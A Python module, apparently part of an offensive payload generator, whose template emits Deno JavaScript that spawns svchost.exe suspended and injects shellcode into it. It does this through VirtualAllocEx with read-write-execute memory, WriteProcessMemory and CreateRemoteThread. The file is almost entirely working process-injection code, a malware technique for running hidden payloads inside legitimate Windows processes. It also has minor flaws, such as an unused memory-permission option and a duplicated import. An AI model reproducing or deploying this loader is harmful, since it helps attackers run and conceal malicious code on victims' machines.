from string import Template

from string import Template

class spawnandinject:
    def __init__(self, arguments):
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
        if 'target' in arguments:
            self.target = arguments['target'].replace('\\','\\\\')

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return """"""

    def template(self) -> str:
        return Template("""
    {transformers}
    
    const kernel32Path = "C:\\\\Windows\\\\System32\\\\kernel32.dll";
    const kernel32 = Deno.dlopen(kernel32Path, {{
        CreateProcessA: {{
            parameters: ["buffer", "buffer", "buffer", "buffer", "i32", "u32", "buffer", "buffer", "buffer", "buffer"],
            result: "i32",
        }},
        WriteProcessMemory: {{
            parameters: ["pointer", "pointer", "buffer", "usize", "pointer"],
            result: "i32",
        }},
        VirtualAllocEx: {{
            parameters: ["pointer", "pointer", "usize", "u32", "u32"],
            result: "pointer",
        }},
        CreateRemoteThread: {{
            parameters: ["pointer", "pointer", "usize", "pointer", "pointer", "u32", "pointer"],
            result: "pointer",
        }},
        WaitForSingleObject: {{
            parameters: ["pointer", "u32"],
            result: "u32",
        }},
        CloseHandle: {{
            parameters: ["pointer"],
            result: "i32",
        }},
    }});

    const si = new Uint8Array(104);
    new DataView(si.buffer).setUint32(0, 104, true);
    const pi = new Uint8Array(24);
    const cmdline = Buffer.from('$target', 'utf8');

    kernel32.symbols.CreateProcessA(null, cmdline, null, null, 0, 0x4, null, null, si, pi);

    const view = new DataView(pi.buffer);
    const hProcess = view.getBigUint64(0, true);
    const hProc = Deno.UnsafePointer.create(hProcess);

    const address = kernel32.symbols.VirtualAllocEx(hProc, null, {shellcodeSize}, 0x3000, 0x40);

    kernel32.symbols.WriteProcessMemory(hProc, address, shellcode, {shellcodeSize}, null);
    
    const hThread = kernel32.symbols.CreateRemoteThread(hProc, null, 0, address, null, 0, null);
    kernel32.symbols.WaitForSingleObject(hThread, 500);
    kernel32.symbols.CloseHandle(hThread);

""").substitute(target=self.target, memoryPermission=self.memoryPermission)